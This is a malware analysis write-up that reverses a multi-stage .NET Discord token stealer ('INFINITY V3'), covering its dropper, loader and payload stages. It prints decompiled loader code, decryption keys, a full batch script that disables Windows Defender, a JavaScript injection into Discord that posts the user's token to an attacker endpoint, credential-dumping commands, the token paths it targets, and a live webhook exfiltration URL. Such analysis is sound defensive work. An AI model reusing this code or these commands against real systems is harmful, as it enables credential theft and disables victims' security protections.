

# INFINITY V3



Filename: Grabber Token Picture.exe

MD5: 2f6002f3184e2a6d519d10d73b7cddb0
SHA1: 7a4f1bf78aeb70db14ea034cc08d914d47d45e08
SHA256: 9a2d5e0a5d3aca815f209ee87c86434335a1b7fb76f6ccc4206b58cbcdb2259e

https://www.malshare.com/sample.php?action=detail&hash=9a2d5e0a5d3aca815f209ee87c86434335a1b7fb76f6ccc4206b58cbcdb2259e

**Info**

*This isn't completely reversed as I've hit a few blocks on the road. Count this still as a work in progress.* 

### Behavior

This is only the behavior that is being seen on the screen. When opening a popup show up with "Windows Defender has **detected, a** Virus/Malware. The **virus as been** removed". The popup looks like a legit popup and would fool a lot of people. Do notice the spelling mistake within the popup. The comma between `detected`,  `a` and `virus as been`

### Checking with Detect It Easy

According to the tool DIE the file is a .NET executable. While still using the tool another interesting thing to look at is the entropy of the executable. Check the malware entropy level and you can quickly discover whether the executable is packed or encrypted. This doesn't mean that a file with a high entropy level is always malicious. The Entropy of our file has a 7.9 in the .text section. So we're possibly dealing with a dropper. 

[DIE] https://github.com/horsicq/Detect-It-Easy
[Entropy] https://en.wikipedia.org/wiki/Entropy_(computing)

### Stage 1 - Dropper

Opening the executable with dnSpy, the original file is called flowers and the function to main is called Loader. Main is unpacking a file from the `exitcollection` resource called `flashinsane.dat`. It's xorring  6144 bytes with key in base64. Then it's loading and executing without writing it to disk. 

```c#
private static void Main()
{
	byte[] array = (byte[])Program.GetResource("exitcollection.resources", "flashinsane.dat");
	byte[] array2 = Convert.FromBase64String("8ABrrgp+ThHUZ9FZHVtAwN5nFitGj7g=");
	for (int i = 0; i < array.Length; i++)
	{
		array[i] ^= array2[i % array2.Length];
	}
	Activator.CreateInstance(Assembly.Load(array).GetExportedTypes()[0], new object[] { typeof(Program) });
}
```

I've written a quick script parsing out flashinsane.dat, deobfuscating the bytes and writing it as `out.bin`. Checking the parsed data with DIE, the tool tells us that it's a .NET file.

```nim
#unpack.nim
import std/[streams, base64]

const decoded = decode("8ABrrgp+ThHUZ9FZHVtAwN5nFitGj7g=")
var 
  strmOpen = newFileStream("Grabber Token Picture.bin", fmRead)
  buffer: array[6144, byte]

strmOpen.setPosition(0x2F8FD0)
strmOpen.peek(buffer)
strmOpen.close()

for i in 0..<buffer.len:
   buffer[i] = buffer[i] xor decoded[i mod decoded.len].byte

var strmClose = newFileStream("out.bin", fmWrite)
strmClose.writeData(addr(buffer), sizeof(buffer))
strmClose.close()
```

### Stage 2 - Loader

Going over the code in dnSpy the loader is parsing out an executable from `Grabber Token Picture.exe` hidden in the `sevendevil` header. The code also has a few configuration options. The configuration is within the base64 string. To make it a bit easier I'll be reusing the dotNET code and changing it a bit around. dotnetFiddle is a great resource for testing short C# code. 

[dotnetFiddle] https://dotnetfiddle.net/REpwDE

```c#
using System;
using System.IO;
using System.Text;

public class Program
{
	public static void Main()
	{
		byte[] buffer = Convert.FromBase64String("BgAAAAFrAWICZGYCYWQCc2YAAmZuCWhoaGhoLmV4ZQFlAXkDcl9rDGhhcm1vbmljLmRhdA==");
		using (MemoryStream memoryStream = new MemoryStream(buffer))
		{
			using (BinaryReader binaryReader = new BinaryReader(memoryStream, Encoding.UTF8))
			{
				for (int i = binaryReader.ReadInt32(); i > 0; i--)
				{
					string key = binaryReader.ReadString();
					string value = binaryReader.ReadString();
					Console.WriteLine("{0} -> {1}", key, value);
				}
			}
		}
	}
}
```

What binaryReader does is read the first byte. This will tell us that it's parsing 6 variables. Then 0x01 will say that the next byte is 1 byte long and so on. This will parse it with a different programming language.

```
06 00 00 00 01 6B 01 62 02 64 66 02 61 64 02 73
^	     ^   ^  ^  ^  ^  ^  ^
	     |	 |  |  |  |  |__|_Chars df
|	     |	 |  |  |	 |_ Two chars
|	     |	 |  |  |_ char b
|_ 6 vars    |	 |  |_ One char 
	     |	 |_ char K
	     |_ One char
66 00 02 66 6E 09 68 68 68 68 68 2E 65 78 65 01 
65 01 79 03 72 5F 6B 0C 68 61 72 6D 6F 6E 69 63 
2E 64 61 74
```

This will give the output. To understand the configuration we've to check every function.

```
# Results

  k -> b
 df -> ad
 sf -> 
 fn -> hhhhh.exe
  e -> y
r_k -> harmonic.dat
```



##### execute()

if the **k** option is **b** then execute ExecuteBinder.

```C#
	private void Execute(Dictionary<string, string> options)
		{
			if (options["k"] == "b")
			{
				this.ExecuteBinder(options);
			}
```



##### ExecuteBinder()

This function is checking if a file exist in the file path returned and if it `options["e"]` is set to y to execute.

```C#
	private void ExecuteBinder(Dictionary<string, string> options)
		{
			string name = options["r_k"];
			byte[] array = this.ReadResources(name) as byte[];
			if (array == null)
			{
				return;
			}
			string text = this.ConstructPath(options);
			if (File.Exists(text))
			{
				try
				{
					File.Delete(text);
				}
				catch
				{
					return;
				}
			}
			File.WriteAllBytes(text, array);
			if (options["e"] == "y")
			{
				Process.Start(text);
			}
		}
```



##### ReadResources() 

Iter from `sevendevil` section until it finds `harmonic.dat` from the executable and return the data.

```c#
		private object ReadResources(string name)
		{
			string name2 = "sevendevil.resources";
			using (Stream manifestResourceStream = this.Asm.GetManifestResourceStream(name2))
			{
				using (ResourceReader resourceReader = new ResourceReader(manifestResourceStream))
				{
					IDictionaryEnumerator enumerator = resourceReader.GetEnumerator();
					while (enumerator.MoveNext())
					{
						if ((string)enumerator.Key == name)
						{
							return enumerator.Value;
						}
					}
				}
			}
			return null;
		}
```



##### ConstructPath()

Set the path to `hhhhh.exe`. The **sf** option is for creating its own directory if it's set.

```c#
		private string ConstructPath(Dictionary<string, string> options)
		{
			string text = options["df"];
			string a;
			if ((a = text) != null)
			{
				if (!(a == "ad"))
				{
					if (!(a == "pd"))
					{
						if (!(a == "t"))
						{
							if (a == "cd")
							{
								text = Environment.CurrentDirectory;
							}
						}
						else
						{
							text = Path.GetTempPath();
						}
					}
					else
					{
						text = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
					}
				}
				else
				{
					text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				}
			}
			string text2 = options["sf"];
			if (!string.IsNullOrEmpty(text2))
			{
				text = Path.Combine(text, text2);
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text).Refresh();
				}
			}
			string path = options["fn"];
			return Path.Combine(text, path);
		}
```



### Stage 3 - hhhhh.exe

The next executable is another dropper. The dropper is splitting the data between `@hsdhi)_u3-04120uj0-asf@` Which gives the following array back

​	[1] {Data}
​	[2] Error
​	[3] The application failed to initialize properly (0x0000022)
​	[4] False

The data is encrypted with the RC4 password `asjd90AS)(RHJ()!@#$JH)(rsgahs09t091209h34h129h0390h231h099n0sagisagklBN@!#` once the data is unencrypted it dumps itself as explore.exe.

Interesting observation is the following debug information: `C:\Users\Mirko\Desktop\INFINITY SOURCE\v3!\Stub\fil1x132\obj\Release\m1231!@#asdasdas.pdb`

### Stage 4 - Explorer.exe



Binaries configuration

```
{
    "cam": false,
    "files": false,
    "shutdown": false,
    "restart": false,
    "rd": false
}
```

Disable Windows Defender

```powershell
@echo off
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f´
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
rem gg
del %0 /f /q
```

Drops TrkBtManServ.exe

### Stage 5 - RtkBtManServ.exe

Drops Nirsoft software for collecting information. From `Explorer.exe`. When the base64 key is used together with `RTkbtManServ.exe` It is trying to connect to `itroublvehacker.gq`. 

`RtkBtManServ.exe" 3DdHBGXJtZaBFfP8HsYgGdL3DLw4WBuf00yKjIbZKNf6jxChJg599sEsND36Da7G/Waa8dzYrEX0/PImVXvuFvGYu0DQCHU8+Zp717y1Wfdd6HmZAvF3ddLoEF+H7rV932JJt5TduuQLzwuPrrTs6ory0pt1ozzD/8FXar83Cpg=`

Nirsoft

* Web Browser History Viewer 2.46

* ChromeCookiesView 1.65

* MZCookiesView 1.58

* Web Browser Password Viewer 2.06

* EdgeCookiesView 1.17

* OEyaTLsQMitFRVPKJJJgIFhwZlDO.dll

  


Other observations 

* Checks for IsLogging

* Checks for VirtualProtect

* Checks `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion` for `DigitalProductId`

* Create a directory files, compress as f.zip and upload to `anonfiles[.]com`

* Copy the following code to the voice module located at `\\modules\\discord_voice\\index.js` of Discord, DiscordCanary, DiscordPTB, DiscordDevelopement. c000015.p000003 is compile.bat or compile.vbs.
  ```javascript
  var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C[\"token\"];var O = new XMLHttpRequest();O.open('POST', '" + c000015.p000003 + "', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{\"content\": ' + strtoken + '}');
  ```

* Creates a screenshot and saves it as a capture.png

* Create compile.bat 
  ```bash
  start %temp%\snuvcdsm.exe /stext "%temp%\%username%_Passwords.txt"
  exit
  ```

* Create compile.vbs
  ``` vbscript
  Dim fso, fName, txt,objshell,UserName,tempfolder
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set tempfolder = fso.GetSpecialFolder(2)
  Set oShell = CreateObject ("Wscript.Shell")
  Dim strArgs
  strArgs = "cmd /c compile.bat"
  oShell.Run strArgs, 0, True
  ```

* Creates {user}_history.txt with web browser history information and upload it to anonfiles

* Copy cookies created from the Nirsoft cookieviewer software. Depending on the output it has headers as  `Cookies Ex [Mix]:`, `Cookies file is empty.`, `No cookies found!`, saves it as {user}_cookies.txt and upload to anonfiles
  ```sh
  start %temp%\\winhlp32.exe /stext \"%temp%\\Cookies1\"
  start %temp%\\splwow64.exe /stext \"%temp%\\Cookies2\"
  start %temp%\\hh.exe /stext \"%temp%\\Cookies3\"
  exit
  ```

  ```
  ==================================================
  Host Name         : .google.com
  Path              : /
  Name              : NID
  Value             : 204=EFhTZlCxp2kRrlMq1FZf2Q3Jb2oRULjnyesclKjVHI9hmzDOEgdJJnK8EFNYB3uZMWZhMTgbUOR2rqfC99iCU-NzuziUpgrGzXo9XkkaJyOXvBvKJ4eFmKztMxgDY9A4tg5tzPQqe3tzkqJYfNzL5Bf94cldrym0Uvc-4g8nhKQ
  Secure            : Yes
  HTTP Only         : Yes
  Last Accessed     : 11/4/2020 3:48:55 AM
  Created On        : 9/28/2020 6:41:56 AM
  Expires           : 3/30/2021 6:41:56 AM
  ==================================================
  ```

* Copy's passwords collected from the nirsoft software and upload to anonfiles.
  ```sh
  start %temp%\\snuvcdsm.exe /stext \"%temp%\\%username%_Passwords.txt\"
  exit
  ```

* Creates and uploads data to discord as `username`, `avatar_url` `content`. The picture used for the avatar is called `ss.png`. Content can be password, cookies, history, SystemINFO.txt, screenshot.png

* Trying to read strings from `https://itroublvehacker.gq/bypass_stealer` 

* Creates a unique base64 ID of the systems MachineGuid, ProcessorID, and Serialnumber

* Search for .log, .ldb, .sqlite

* Send all the detail as Frank to Discord
  ```json
  # Example
  
  {
  	"username": "Frank",
  	"avatar_url": "ss.png",
  	"content": "Passwords",
    	"embeds": [
      {
        "title": "",
        "color": 1127128
      },
  }
  ```

* Copy tokens
  ```
  \\discord\\Local Storage\\leveldb\\
  \\Lightcord\\Local Storage\\leveldb\\
  \\discorddevelopment\\Local Storage\\leveldb\\
  \\discordcanary\\Local Storage\\leveldb\\
  \\discordptb\\Local Storage\\leveldb\\
  \\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\
  \\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\
  \\BraveSoftware\\Brave-Browser-Nightly\\User Data\\Default\\Local Storage\\leveldb\\
  \\Opera Software\\Opera Stable\\Local Storage\\leveldb\\
  \\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\
  \\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\
  \\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\
  \\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\
  \\Mozilla\\Firefox\\Profiles\\webappsstore.sqlite
  ```

* Using Nirsoft to create a screenshot
  ```sh
  start %temp%\\bfsvc.exe /capture /Filename \"%temp%\\capture.png\
  exit
  ```

* Generates the Discord webhook url 
  ```
  http://discord.com/api/v6/webhooks/951530422976790528/KWL-_fgp0yDlQyalmDBem11c_C_VmnpsmzTwSeBGRRoUXz40Wa9q_Me_zD6yyxdzLu4J
  ```

[Virtualprotect] https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
[isLogging] https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.debugger.islogging?view=net-6.0
[unpac] unpac.me/results/bd7d7188-71f3-45ea-9572-b005efe8117e
[TLD gq] https://en.wikipedia.org/wiki/.gq
[Discord Webhooks] https://birdie0.github.io/discord-webhooks-guide/index.html

